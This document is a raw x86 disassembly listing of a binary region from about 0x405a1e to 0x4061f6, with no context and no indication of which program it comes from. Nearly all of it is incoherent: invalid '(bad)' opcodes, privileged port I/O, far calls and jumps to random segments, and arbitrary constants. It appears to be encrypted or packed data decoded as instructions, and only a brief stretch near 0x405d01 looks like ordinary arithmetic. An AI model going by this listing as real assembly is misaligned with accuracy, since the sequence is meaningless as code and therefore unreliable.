  405a1e:	jl     0x4059bc
  405a20:	in     al,dx
  405a21:	rol    BYTE PTR [esi],1
  405a23:	or     DWORD PTR [edx],0x2e4344fd
  405a29:	loopne 0x405a85
  405a2b:	cmp    eax,0x96400d59
  405a31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a33:	sbb    eax,0x19bb84a6
  405a38:	fcmovb st,st(4)
  405a3a:	in     al,dx
  405a3b:	mov    al,0x99
  405a3d:	jbe    0x405a1c
  405a3f:	call   0x957:0x197f5f6f
  405a46:	leave  
  405a47:	or     DWORD PTR [ebp+0x5f],esi
  405a4a:	push   ebp
  405a4b:	push   ds
  405a4c:	sub    al,0x2c
  405a4e:	xor    al,BYTE PTR [eax+0x66]
  405a51:	mov    ebx,0x5a227694
  405a56:	out    dx,eax
  405a57:	stos   BYTE PTR es:[edi],al
  405a58:	data16 add ah,cl
  405a5b:	out    0xa,al
  405a5d:	push   ecx
  405a5e:	loop   0x405a81
  405a60:	ret    
  405a61:	daa    
  405a62:	loope  0x405a00
  405a64:	(bad)  
  405a65:	jp     0x405a99
  405a67:	icebp  
  405a68:	lds    ebp,FWORD PTR [ebx+0x35fe8b73]
  405a6e:	ss sar ecx,cl
  405a71:	sub    ecx,DWORD PTR [edx-0x6e]
  405a74:	fs test al,0x5d
  405a77:	cs (bad) 
  405a7a:	sbb    al,0xf7
  405a7c:	sbb    BYTE PTR [eax+0x7bc7f948],0x63
  405a83:	mov    ebp,0xdd521a9d
  405a88:	test   BYTE PTR [esi],dh
  405a8a:	adc    BYTE PTR ds:[edi],bh
  405a8d:	(bad)  
  405a8f:	adc    BYTE PTR [ebp+esi*4-0x2f7041ba],0x54
  405a97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a98:	mov    esi,0xff46fd09
  405a9d:	push   esi
  405a9e:	xchg   ecx,eax
  405a9f:	repnz daa 
  405aa1:	push   es
  405aa2:	jb     0x405a62
  405aa4:	ret    0x371b
  405aa7:	or     BYTE PTR [ebx+0x6203d75e],0x3d
  405aae:	sub    ecx,DWORD PTR [ebx]
  405ab0:	cli    
  405ab1:	sub    eax,0xe6552739
  405ab6:	in     eax,0x91
  405ab8:	adc    eax,0xf0bc61c3
  405abd:	or     BYTE PTR ds:0xb66344d1,ah
  405ac3:	jae    0x405ad6
  405ac5:	xchg   ebp,eax
  405ac6:	mov    WORD PTR [edi+edi*2],ds
  405ac9:	xchg   ebx,eax
  405aca:	bound  edx,QWORD PTR [ecx]
  405acc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405acd:	sti    
  405ace:	pushf  
  405acf:	mov    dl,0x9d
  405ad1:	(bad)  
  405ad2:	xor    DWORD PTR [ebx-0x1e484a22],eax
  405ad8:	das    
  405ad9:	outs   dx,DWORD PTR ds:[esi]
  405ada:	loopne 0x405ac1
  405adc:	mov    ebp,0x437fb8d9
  405ae1:	and    eax,0xc7ad417c
  405ae6:	adc    ecx,DWORD PTR [edi+0x18491dc0]
  405aec:	out    0xbf,eax
  405aee:	xchg   ebp,eax
  405aef:	imul   ebx,ebx,0x3
  405af2:	leave  
  405af3:	xchg   ebx,eax
  405af4:	xor    BYTE PTR ss:[ecx],ch
  405af7:	jo     0x405b6e
  405af9:	pop    eax
  405afa:	jne    0x405b63
  405afc:	adc    ch,al
  405afe:	enter  0xf6f4,0xa0
  405b02:	cwde   
  405b03:	push   edx
  405b04:	ds inc ebx
  405b06:	aam    0xac
  405b08:	cmp    eax,0xeb11462d
  405b0d:	fist   WORD PTR [edi]
  405b0f:	push   es
  405b10:	xor    ah,al
  405b12:	(bad)  
  405b13:	loope  0x405aeb
  405b15:	fs call 0x20d2:0x8348bc80
  405b1d:	mov    ds:0x38c589a3,al
  405b22:	xchg   BYTE PTR [edi+0x77],dl
  405b25:	int    0x59
  405b27:	jae    0x405b18
  405b29:	or     eax,0x6aa02047
  405b2e:	sub    esp,DWORD PTR [esi+0x5442b2f]
  405b34:	out    dx,al
  405b35:	add    bh,ch
  405b37:	mov    DWORD PTR [esi+0x4f],esp
  405b3a:	or     DWORD PTR [ebp+0x59a9bfd7],eax
  405b40:	jnp    0x405ad9
  405b42:	push   0xc09002c8
  405b47:	nop
  405b48:	leave  
  405b49:	scas   al,BYTE PTR es:[edi]
  405b4a:	and    al,0x2
  405b4c:	mov    ds:0x84de8803,eax
  405b51:	xchg   esi,eax
  405b52:	inc    ecx
  405b53:	push   es
  405b54:	sahf   
  405b55:	mov    edi,0x74b33c49
  405b5a:	pop    edi
  405b5b:	sbb    DWORD PTR [eax-0x6c],edx
  405b5e:	sub    al,0x31
  405b60:	mov    ebp,0x2c26daf2
  405b65:	xor    cl,BYTE PTR [esi+eax*2]
  405b68:	lods   al,BYTE PTR ds:[esi]
  405b69:	adc    BYTE PTR [eax-0x66],ah
  405b6c:	imul   edi,DWORD PTR [eax-0x69e88ab6],0xf3e54a02
  405b76:	sbb    ecx,DWORD PTR [ebp-0x3b903cff]
  405b7c:	jmp    0xe40f:0xb824e699
  405b83:	aaa    
  405b84:	sub    al,0x17
  405b86:	out    dx,eax
  405b87:	mov    dh,0x49
  405b89:	xor    esi,DWORD PTR [edi+0x62f0d541]
  405b8f:	xor    DWORD PTR [ecx-0x4ced6b48],edi
  405b95:	mov    dl,0x4d
  405b97:	jmp    0x405ba3
  405b99:	outs   dx,BYTE PTR ds:[esi]
  405b9a:	xchg   ebx,eax
  405b9b:	xchg   esi,eax
  405b9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b9d:	mov    BYTE PTR [ebx+0x22],ch
  405ba0:	sub    edx,DWORD PTR [ecx]
  405ba2:	(bad)  
  405ba3:	fnsave [ebx+0x2438fdb6]
  405ba9:	sbb    eax,0x38993ad4
  405bae:	iret   
  405baf:	addr16 loop 0x405bb3
  405bb2:	leave  
  405bb3:	push   edx
  405bb4:	sbb    BYTE PTR [ecx-0x5524e47f],ch
  405bba:	sub    al,0xf2
  405bbc:	rcl    DWORD PTR [eax],0x74
  405bbf:	push   ss
  405bc0:	cmp    DWORD PTR [ecx],0x1319f0af
  405bc6:	cmp    eax,0xf0e87253
  405bcb:	sub    eax,0xbb125fd1
  405bd0:	fcomp  DWORD PTR [eax+0x742b7393]
  405bd6:	mov    ah,0xf9
  405bd8:	ret    
  405bd9:	mov    cl,ah
  405bdb:	mov    eax,0xda1daef6
  405be0:	clc    
  405be1:	push   esp
  405be2:	test   al,0x44
  405be4:	xor    eax,0xa07cdce
  405be9:	clc    
  405bea:	ret    
  405beb:	mov    ebx,0x573d1c12
  405bf0:	js     0x405b76
  405bf2:	jb     0x405c2b
  405bf4:	jns    0x405be8
  405bf6:	add    al,0xb5
  405bf8:	out    0x3d,eax
  405bfa:	jg     0x405bde
  405bfc:	repz sahf 
  405bfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bff:	mov    cl,0xff
  405c01:	and    eax,0x97844c56
  405c06:	aaa    
  405c07:	adc    BYTE PTR [ecx-0x1660efdd],bh
  405c0d:	xchg   esp,eax
  405c0e:	dec    esi
  405c0f:	pop    eax
  405c10:	pop    edi
  405c11:	lahf   
  405c12:	ja     0x405c52
  405c14:	add    eax,0x45a7f6d6
  405c19:	push   ebx
  405c1a:	les    eax,FWORD PTR [eax-0x1d]
  405c1d:	xchg   ecx,eax
  405c1e:	mov    dh,0x26
  405c20:	push   eax
  405c21:	inc    esp
  405c22:	(bad)  
  405c23:	cmc    
  405c24:	scas   eax,DWORD PTR es:[edi]
  405c25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c26:	xor    bl,0xe4
  405c29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c2a:	xor    DWORD PTR [edi+0x27],eax
  405c2d:	mul    DWORD PTR [edx+0x20]
  405c30:	imul   edi,DWORD PTR [esi],0xcdf1adf3
  405c36:	in     al,dx
  405c37:	jb     0x405bba
  405c39:	pop    es
  405c3a:	sti    
  405c3b:	ss aas 
  405c3d:	ret    0x60d1
  405c40:	mul    DWORD PTR [edx-0x2]
  405c43:	bound  ebp,QWORD PTR [ebp-0x20ec5f5e]
  405c49:	rcr    DWORD PTR [edx*2-0x5e1a0be9],cl
  405c50:	mov    ds:0xfbb4872b,eax
  405c55:	add    esi,ebp
  405c57:	stos   DWORD PTR es:[edi],eax
  405c58:	jne    0x405ca1
  405c5a:	or     al,0x93
  405c5c:	inc    esp
  405c5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c5e:	dec    ecx
  405c5f:	call   0x1fc2:0x68d071eb
  405c66:	test   DWORD PTR [esi+esi*4-0x45],0x775294c4
  405c6e:	sub    eax,0x253da885
  405c73:	mov    ebp,DWORD PTR [esi+0x8771311]
  405c79:	aad    0xaa
  405c7b:	mov    dl,0x2b
  405c7d:	hlt    
  405c7e:	cli    
  405c7f:	icebp  
  405c80:	aaa    
  405c81:	dec    edx
  405c82:	add    ebx,edi
  405c84:	push   0x7c
  405c86:	mov    DWORD PTR [ebx-0x960f320],esi
  405c8c:	ficomp DWORD PTR [edi]
  405c8e:	push   esi
  405c8f:	jg     0x405cd2
  405c91:	xor    BYTE PTR [ebp-0x29],dh
  405c94:	pop    edi
  405c95:	call   0x8a872b49
  405c9a:	dec    ebp
  405c9b:	and    eax,0xa5366d6f
  405ca0:	xor    BYTE PTR [edx+0x92c74db],ah
  405ca6:	inc    esp
  405ca7:	add    BYTE PTR [ebp-0x3c],ah
  405caa:	sbb    al,0x24
  405cac:	retf   
  405cad:	(bad)
  405cb1:	mov    al,0x35
  405cb3:	leave  
  405cb4:	sbb    eax,DWORD PTR [ebp-0x11]
  405cb7:	xor    al,0x38
  405cb9:	inc    eax
  405cba:	cmp    BYTE PTR [eax+edx*8-0x7b241f53],bl
  405cc1:	sub    DWORD PTR ds:0x39a762eb,0x6b483ba9
  405ccb:	jmp    0x405c79
  405ccd:	push   cs
  405cce:	daa    
  405ccf:	dec    esi
  405cd0:	dec    ecx
  405cd1:	pusha  
  405cd2:	push   ecx
  405cd3:	scas   al,BYTE PTR es:[edi]
  405cd4:	and    eax,0x751de5f3
  405cd9:	aaa    
  405cda:	fwait
  405cdb:	rcr    DWORD PTR [esi-0x7348c937],0x2d
  405ce2:	mov    edi,0x9043c9ff
  405ce7:	mov    edi,0x5115cdfb
  405cec:	sbb    al,0x34
  405cee:	dec    ebx
  405cef:	shr    BYTE PTR [eax+0x7c4343da],cl
  405cf5:	sar    BYTE PTR ds:0x558b8c38,1
  405cfb:	int3   
  405cfc:	jmp    0x4063dc
  405d01:	mov    edx,DWORD PTR [ebp-0x3c]
  405d04:	mov    edi,DWORD PTR [ebp-0x4]
  405d07:	xor    edx,eax
  405d09:	xor    edi,eax
  405d0b:	add    edx,ecx
  405d0d:	add    edi,ecx
  405d0f:	imul   edx,edi
  405d12:	mov    edi,DWORD PTR [ebp-0x8]
  405d15:	mov    ebx,DWORD PTR [ebp-0x10]
  405d18:	sub    ebx,edi
  405d1a:	jmp    0x406074
  405d1f:	jmp    0xd15f6e3f
  405d24:	xor    eax,0xe321e9f1
  405d29:	les    ecx,FWORD PTR [edi]
  405d2b:	or     DWORD PTR [ebx+esi*1+0x7e3e2f88],edx
  405d32:	jle    0x405d67
  405d34:	jge    0x405db4
  405d36:	jle    0x405d80
  405d38:	pop    ebx
  405d39:	push   0x11
  405d3b:	inc    esi
  405d3c:	sar    BYTE PTR [ecx],cl
  405d3e:	sub    al,0x30
  405d41:	push   es
  405d42:	xchg   esp,eax
  405d43:	mov    dh,0xc5
  405d45:	iret   
  405d46:	lock jne 0x405d8c
  405d49:	pop    es
  405d4a:	daa    
  405d4b:	cmp    BYTE PTR [ebp-0x3eda1b86],dh
  405d51:	pop    ecx
  405d52:	push   0xffffff9b
  405d54:	mov    eax,ds:0x80e462cf
  405d59:	lods   eax,DWORD PTR ds:[esi]
  405d5a:	sbb    DWORD PTR [ecx+0x3be365],eax
  405d60:	ins    DWORD PTR es:[edi],dx
  405d61:	aaa    
  405d62:	push   0xfdb18817
  405d67:	enter  0xfe79,0x27
  405d6b:	aas    
  405d6c:	push   ecx
  405d6d:	mov    ecx,DWORD PTR [edx+eax*1]
  405d70:	mov    cl,0x86
  405d72:	repz mov bl,0xd6
  405d75:	stos   BYTE PTR es:[edi],al
  405d76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d77:	inc    eax
  405d78:	retf   
  405d79:	es dec ebx
  405d7b:	dec    edx
  405d7c:	dec    ebp
  405d7d:	int3   
  405d7e:	sbb    eax,DWORD PTR ds:0x195a1190
  405d84:	enter  0x7191,0x57
  405d88:	test   DWORD PTR [eax],eax
  405d8a:	mov    esi,0x2e35ed12
  405d8f:	fcom   DWORD PTR [di+0x6968]
  405d94:	mov    dl,dl
  405d96:	les    edx,FWORD PTR [ebx+ecx*8]
  405d99:	test   DWORD PTR [edi-0x6baf3ee],edi
  405d9f:	pop    ebp
  405da0:	push   ecx
  405da1:	and    ch,0x74
  405da4:	pop    edx
  405da5:	and    DWORD PTR [esi],edi
  405da7:	aaa    
  405da8:	lahf   
  405da9:	and    ebp,DWORD PTR [edx-0x4629898a]
  405daf:	mov    esi,0xd817be08
  405db4:	add    eax,0xf16c6107
  405db9:	add    BYTE PTR [ebp-0x2c91c805],bl
  405dbf:	les    ebx,FWORD PTR [edx]
  405dc1:	test   eax,0xc0cf8c2f
  405dc6:	pop    ecx
  405dc7:	add    bl,bh
  405dc9:	stos   DWORD PTR es:[edi],eax
  405dca:	xchg   DWORD PTR [edi+0x4a81f2a5],ecx
  405dd0:	aam    0x25
  405dd2:	(bad)  
  405dd3:	sar    DWORD PTR [ebx],cl
  405dd5:	stos   DWORD PTR es:[edi],eax
  405dd6:	pop    esi
  405dd7:	fsub   DWORD PTR [edx+0x111e1c60]
  405ddd:	outs   dx,BYTE PTR ds:[esi]
  405ddf:	(bad)  
  405de0:	imul   ecx,esp,0xcbf582ec
  405de6:	inc    ebx
  405de7:	mov    ds:0xebc6b526,al
  405dec:	xchg   esi,eax
  405ded:	repnz or DWORD PTR [edx-0x1a],ecx
  405df1:	sti    
  405df2:	cs mov ah,0xa0
  405df5:	xor    DWORD PTR [eax+0x19],ebp
  405df8:	xchg   ebx,eax
  405df9:	sub    ebp,edx
  405dfb:	push   es
  405dfc:	rol    DWORD PTR [edi],1
  405dfe:	jno    0x405dfc
  405e00:	aad    0x5d
  405e02:	ss hlt 
  405e04:	ds ret 0xe15e
  405e08:	pop    esi
  405e09:	add    al,0x95
  405e0b:	cmp    bl,BYTE PTR [esi+0x70]
  405e0e:	jmp    0x4c62e74a
  405e13:	mov    ch,0xd9
  405e15:	inc    ebp
  405e16:	enter  0xfc6c,0xec
  405e1a:	test   al,0x46
  405e1c:	xchg   ecx,eax
  405e1d:	push   0x6a9056b9
  405e22:	mov    cl,0xc6
  405e24:	xlat   BYTE PTR ds:[ebx]
  405e25:	(bad)  
  405e27:	sub    eax,0xa01fe9b3
  405e2c:	(bad)  
  405e2d:	mov    ds:0xa187d5b0,al
  405e32:	cmp    cl,dl
  405e34:	stos   BYTE PTR es:[edi],al
  405e35:	mov    esi,gs
  405e37:	jle    0x405e59
  405e39:	pop    ss
  405e3a:	push   edi
  405e3b:	bound  esi,QWORD PTR [esi-0x31b002a7]
  405e41:	add    BYTE PTR [ebx+0x61be13d7],bh
  405e47:	aaa    
  405e48:	mov    ah,0xf1
  405e4a:	enter  0xaa6f,0x62
  405e4e:	mov    al,ds:0x83222962
  405e53:	lods   eax,DWORD PTR ds:[esi]
  405e54:	or     DWORD PTR [ebx+0x6d],edx
  405e57:	ja     0x405e6e
  405e59:	xchg   ebp,eax
  405e5a:	xchg   ebp,eax
  405e5b:	mov    esi,0xd43197f0
  405e60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e61:	hlt    
  405e62:	(bad)  
  405e63:	inc    ebp
  405e64:	push   0x6f09715c
  405e69:	xlat   BYTE PTR ds:[ebx]
  405e6a:	jno    0x405ebd
  405e6c:	test   BYTE PTR [edx+0x41],bh
  405e6f:	jge    0x405e92
  405e71:	adc    DWORD PTR [esi+0x69],0x5feca7e3
  405e78:	das    
  405e79:	cwde   
  405e7a:	stos   DWORD PTR es:[edi],eax
  405e7b:	push   edi
  405e7c:	loopne 0x405e11
  405e7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e7f:	dec    ebx
  405e80:	sub    eax,0x4a470b43
  405e85:	and    DWORD PTR ds:0xedd92f02,edi
  405e8b:	xchg   ecx,eax
  405e8c:	nop
  405e8d:	cs js  0x405ee5
  405e90:	popa   
  405e91:	adc    eax,0x5aac5785
  405e96:	pusha  
  405e97:	in     al,0x9f
  405e99:	lods   al,BYTE PTR ds:[esi]
  405e9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e9b:	jae    0x405f1b
  405e9d:	gs dec ebx
  405e9f:	adc    BYTE PTR ds:0xfb0baf21,0x79
  405ea6:	mov    bh,0xaa
  405ea8:	or     BYTE PTR [ecx+0x62ce95c0],ah
  405eae:	lods   al,BYTE PTR ds:[esi]
  405eaf:	jl     0x405e99
  405eb1:	popf   
  405eb2:	or     bh,ah
  405eb4:	fidiv  WORD PTR [edi-0x37]
  405eb7:	out    0x1a,al
  405eb9:	retf   0xb9bb
  405ebc:	sub    dl,BYTE PTR [edi+0x40d04d5b]
  405ec2:	jl     0x405e7d
  405ec4:	ficomp DWORD PTR [ebx]
  405ec6:	enter  0xd437,0x54
  405eca:	sub    al,0xdf
  405ecc:	test   DWORD PTR ds:[edi],edx
  405ecf:	sbb    esi,0x57
  405ed2:	stc    
  405ed3:	and    eax,0xc4d05501
  405ed8:	jns    0x405ebc
  405eda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405edb:	pop    ecx
  405edc:	and    dl,BYTE PTR [edi+0x4a]
  405edf:	xchg   ecx,eax
  405ee0:	retf   0xd00e
  405ee3:	arpl   bx,cx
  405ee5:	int3   
  405ee6:	mov    ebx,0x61f1a194
  405eeb:	jge    0x405e85
  405eed:	cmp    eax,0xf3b5bb55
  405ef2:	sbb    DWORD PTR [ecx+eax*2+0x4f],0x320e6f79
  405efa:	icebp  
  405efb:	(bad)  
  405efd:	in     al,0xdf
  405eff:	mov    ecx,0xf5fb3424
  405f04:	mov    dh,0x5
  405f06:	pop    eax
  405f07:	mov    dh,0x7c
  405f09:	sti    
  405f0a:	dec    ebp
  405f0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f0c:	xchg   BYTE PTR [eax+0xc896893],bl
  405f12:	xor    bl,al
  405f14:	repz pop ebp
  405f16:	adc    ch,BYTE PTR [edx+0x1]
  405f19:	call   0xf3ec:0x1910cad1
  405f20:	push   ebp
  405f21:	repnz sub ah,BYTE PTR [edx-0x4edfe95d]
  405f28:	mul    esi
  405f2a:	daa    
  405f2b:	mov    ds:0xbd6621b7,eax
  405f30:	mov    edi,esi
  405f32:	rol    DWORD PTR [ebp+edi*4+0x7c],0x76
  405f37:	cmp    DWORD PTR [edx-0x6d],edx
  405f3a:	enter  0xc8b2,0x90
  405f3e:	enter  0x7587,0x5a
  405f42:	push   esi
  405f43:	out    0x2f,eax
  405f45:	ret    
  405f46:	sbb    esp,DWORD PTR [edx]
  405f48:	imul   edx,DWORD PTR [ebx-0xdcee24d],0x48
  405f4f:	and    eax,0xcb975f37
  405f54:	retf   
  405f55:	xor    eax,0x39c4e98f
  405f5a:	sub    edi,edx
  405f5c:	repnz adc ah,BYTE PTR [ebx-0x76]
  405f60:	cli    
  405f61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f62:	ret    
  405f63:	adc    ecx,ebp
  405f65:	pmaddwd mm1,QWORD PTR [ecx]
  405f68:	jo     0x405f65
  405f6a:	jb     0x405fa3
  405f6c:	std    
  405f6d:	mov    bh,0x5f
  405f6f:	adc    edi,ebx
  405f71:	cmc    
  405f72:	inc    esi
  405f73:	add    bh,BYTE PTR [eax]
  405f75:	mov    dl,0xd
  405f77:	outs   dx,BYTE PTR ds:[esi]
  405f78:	mov    al,ds:0x7f13e8c0
  405f7d:	enter  0xf2eb,0xe3
  405f81:	add    cl,cl
  405f83:	(bad)  
  405f84:	fiadd  DWORD PTR [edx]
  405f86:	mov    ch,bl
  405f88:	jp     0x406000
  405f8a:	in     eax,0xb8
  405f8c:	test   al,0x22
  405f8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f8f:	sahf   
  405f90:	imul   esp,DWORD PTR [edi],0xae999f20
  405f96:	pushf  
  405f97:	push   ecx
  405f98:	sub    ebx,DWORD PTR [ebp+0x20]
  405f9b:	shr    DWORD PTR [edx+edi*2+0x638503d6],1
  405fa2:	adc    bl,dh
  405fa4:	push   esi
  405fa5:	je     0x405fa3
  405fa7:	or     edx,DWORD PTR [ecx-0x3c]
  405faa:	xchg   ebp,eax
  405fab:	pop    edx
  405fac:	mov    al,ds:0x40b65521
  405fb1:	mov    eax,0xfff22e46
  405fb6:	cdq    
  405fb7:	inc    ebp
  405fb8:	jl     0x405fbc
  405fba:	bnd jg 0x405fff
  405fbd:	jo     0x405fd9
  405fbf:	jle    0x40600c
  405fc1:	cmp    esi,DWORD PTR [ebp+0x14756609]
  405fc7:	icebp  
  405fc8:	xor    DWORD PTR [edx],esp
  405fca:	rcr    ebp,1
  405fcc:	mov    bh,0xda
  405fce:	inc    esi
  405fcf:	inc    edx
  405fd0:	pop    ebx
  405fd1:	cld    
  405fd2:	repnz cli 
  405fd4:	mov    edx,0x66810871
  405fd9:	fimul  DWORD PTR ds:0xae9c4c54
  405fdf:	xchg   esp,eax
  405fe0:	int    0xa5
  405fe2:	jo     0x40604f
  405fe4:	jno    0x40601b
  405fe6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fe7:	or     al,0x40
  405fe9:	sbb    esp,DWORD PTR [edi+0xb]
  405fec:	bound  ebp,QWORD PTR [esi-0x81d4779]
  405ff2:	imul   esi,DWORD PTR [ebx+0x2780a5d2],0xdec5b75c
  405ffc:	out    0xad,al
  405ffe:	repz mov al,ds:0xb9ee1db
  406004:	inc    edx
  406005:	js     0x406054
  406007:	xchg   esp,ecx
  406009:	dec    ebp
  40600a:	xor    DWORD PTR [ebp+0x7436c07e],eax
  406010:	push   ebp
  406011:	lods   al,BYTE PTR ds:[esi]
  406012:	fisub  DWORD PTR [esi+0x59]
  406015:	scas   al,BYTE PTR es:[edi]
  406016:	cs sahf 
  406018:	and    eax,DWORD PTR [edx]
  40601a:	push   ecx
  40601b:	ins    BYTE PTR es:[edi],dx
  40601c:	jg     0x406078
  40601e:	into   
  40601f:	inc    edi
  406020:	cmp    DWORD PTR [edx-0x425fb7a8],ebp
  406026:	cwde   
  406027:	arpl   bp,bp
  406029:	add    eax,0xb893e886
  40602e:	push   ecx
  40602f:	push   0x4ea7d33c
  406034:	mov    edi,0x4a15d156
  406039:	pop    esi
  40603a:	xor    edi,esi
  40603c:	fucomip st,st(1)
  40603e:	adc    cl,BYTE PTR gs:[ebx]
  406041:	scas   al,BYTE PTR es:[edi]
  406042:	add    esi,edi
  406044:	(bad)  
  406045:	das    
  406046:	aaa    
  406047:	xchg   BYTE PTR ds:0xe82e673d,ah
  40604d:	gs mov bl,0x72
  406050:	test   DWORD PTR [esi],esp
  406052:	dec    ebp
  406053:	xchg   ebp,eax
  406054:	xchg   edx,eax
  406055:	xchg   DWORD PTR es:[edi],esp
  406058:	or     eax,0x7a475c0e
  40605d:	dec    edi
  40605e:	xor    ah,BYTE PTR [ecx]
  406060:	dec    ebx
  406061:	push   eax
  406062:	imul   ecx
  406064:	call   0x2254:0x3d0590d4
  40606b:	pop    ds
  40606c:	add    DWORD PTR [ebx],ecx
  40606e:	inc    edx
  40606f:	dec    ch
  406071:	push   ss
  406072:	call   0x8c1a9c6c
  406077:	push   ebp
  406078:	enter  0x55e9,0x3
  40607c:	add    BYTE PTR [eax],al
  40607e:	test   eax,0x68f06eef
  406083:	jno    0x406036
  406085:	ja     0x406061
  406087:	shr    BYTE PTR [edx+0x79],0x16
  40608b:	lahf   
  40608c:	add    ch,BYTE PTR [eax-0x20]
  40608f:	cmp    eax,0x7d337e7e
  406094:	jle    0x406114
  406096:	add    BYTE PTR [ebp-0x19],ch
  406099:	dec    esp
  40609a:	dec    eax
  40609b:	test   DWORD PTR [ecx+ebx*1],edi
  40609e:	pusha  
  40609f:	fild   QWORD PTR [edi+0x7b]
  4060a2:	inc    ecx
  4060a3:	sub    eax,0x3bb3b7d5
  4060a8:	inc    BYTE PTR [edx+0x44657a4c]
  4060ae:	jo     0x4060e0
  4060b0:	or     edx,DWORD PTR [edx+ebp*1]
  4060b3:	retf   
  4060b4:	jo     0x406125
  4060b6:	ins    DWORD PTR es:[edi],dx
  4060b7:	pop    esi
  4060b8:	mov    edi,edx
  4060ba:	cmp    al,BYTE PTR [eax+0x42]
  4060bd:	pop    esi
  4060be:	xor    eax,0x2b3af98a
  4060c3:	jle    0x4060e6
  4060c5:	jnp    0x4060ca
  4060c7:	dec    edx
  4060c8:	in     al,dx
  4060c9:	mov    edi,0xf4cf8ba6
  4060ce:	outs   dx,DWORD PTR ds:[esi]
  4060cf:	dec    ebx
  4060d0:	sbb    dh,bh
  4060d2:	stos   DWORD PTR es:[edi],eax
  4060d3:	loop   0x406109
  4060d5:	mov    edi,eax
  4060d7:	in     eax,0x94
  4060d9:	aad    0xa7
  4060db:	sub    dl,BYTE PTR [edi-0x69]
  4060de:	(bad)  
  4060df:	leave  
  4060e0:	xchg   ebp,eax
  4060e1:	outs   dx,DWORD PTR ds:[esi]
  4060e2:	lds    esp,FWORD PTR [edx-0x4d]
  4060e5:	pop    esp
  4060e6:	mov    eax,0x4c388c92
  4060eb:	cwde   
  4060ec:	and    esi,DWORD PTR [esi+edx*2+0x75]
  4060f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060f1:	xchg   ebx,eax
  4060f2:	cli    
  4060f3:	ret    0x44a5
  4060f6:	push   ds
  4060f7:	xchg   ebp,eax
  4060f8:	fdivr  QWORD PTR [esi-0xef2a4fc]
  4060fe:	cdq    
  4060ff:	aaa    
  406100:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406101:	int    0x41
  406103:	addr16 and eax,0x7812d7af
  406109:	inc    edx
  40610a:	push   esi
  40610b:	mov    ebp,0xe87c995e
  406110:	and    ecx,DWORD PTR [ecx+edi*2]
  406113:	dec    ecx
  406114:	out    dx,eax
  406115:	mov    ?,WORD PTR [eax]
  406117:	push   ss
  406118:	and    BYTE PTR [edi],cl
  40611a:	inc    ebx
  40611b:	push   es
  40611c:	bound  esi,QWORD PTR [ebx]
  40611e:	aam    0x33
  406120:	jp     0x406118
  406122:	jle    0x406176
  406124:	sti    
  406125:	ss jae 0x4060c7
  406128:	adc    al,ah
  40612a:	sar    BYTE PTR [ecx-0x5f],cl
  40612d:	dec    edi
  40612e:	out    0xa0,al
  406130:	xchg   DWORD PTR [ebx],ecx
  406132:	xor    esp,DWORD PTR [esi+0x14a98438]
  406138:	in     al,dx
  406139:	fcmovnbe st,st(7)
  40613b:	jge    0x40617c
  40613d:	pop    ds
  40613e:	test   eax,0xc0e728de
  406143:	(bad)  
  406144:	jae    0x406192
  406146:	xchg   esi,eax
  406147:	jl     0x406161
  406149:	(bad)  
  40614a:	cmp    eax,0xf2cfb185
  40614f:	add    BYTE PTR [esi+eax*2-0x34],ch
  406153:	mov    ebx,0xa5ac6be4
  406158:	dec    ecx
  406159:	call   0xeee1:0xca3ccb96
  406160:	mov    esi,0x35c38997
  406165:	add    DWORD PTR [ebx-0x6ea8c4a3],ebx
  40616b:	xor    BYTE PTR [edx-0x5],cl
  40616e:	jmp    0x22ca8e9c
  406173:	in     al,0x55
  406175:	push   ecx
  406176:	arpl   WORD PTR [edx+0x45],si
  406179:	push   ebp
  40617a:	or     al,0x5c
  40617c:	shr    BYTE PTR [esi+0x77],1
  40617f:	sub    eax,0xc8263b92
  406184:	pop    ecx
  406185:	arpl   WORD PTR [edx-0x71],dx
  406188:	dec    ecx
  406189:	out    dx,al
  40618a:	fs pop ebp
  40618c:	pop    eax
  40618d:	pop    ebx
  40618e:	jmp    0x4480:0x9aab4e7e
  406195:	inc    edi
  406196:	in     al,0x9a
  406198:	mov    cl,ch
  40619a:	mov    gs,esi
  40619c:	test   DWORD PTR [edi+0x370aa7fc],ebp
  4061a2:	inc    edx
  4061a3:	ds clc 
  4061a5:	call   0xc49:0xd110f9f3
  4061ac:	push   ebp
  4061ad:	cmc    
  4061ae:	ds sub eax,0x6876c7b
  4061b4:	in     al,0x30
  4061b6:	xor    DWORD PTR [esi],eax
  4061b8:	push   ss
  4061b9:	leave  
  4061ba:	adc    eax,0xa6d11948
  4061bf:	xor    BYTE PTR [ecx+eiz*8+0x23],ah
  4061c3:	ficom  DWORD PTR [edx+0x50cd322e]
  4061c9:	dec    ecx
  4061ca:	repz push esi
  4061cc:	push   cs
  4061cd:	sub    al,0xf8
  4061cf:	sub    DWORD PTR [edx+0x4711b9f3],ecx
  4061d5:	push   ebp
  4061d6:	jb     0x406162
  4061d8:	int    0xe1
  4061da:	fistp  WORD PTR [ebp+0x39]
  4061dd:	add    al,0xf9
  4061df:	dec    ebp
  4061e0:	out    dx,eax
  4061e1:	rcr    BYTE PTR [edx+0x129b065e],cl
  4061e7:	out    0x57,eax
  4061e9:	bound  esi,QWORD PTR [ebp-0x14]
  4061ec:	imul   eax,DWORD PTR [eax-0x530006bd],0xddbd9ac7
  4061f6:	iret   
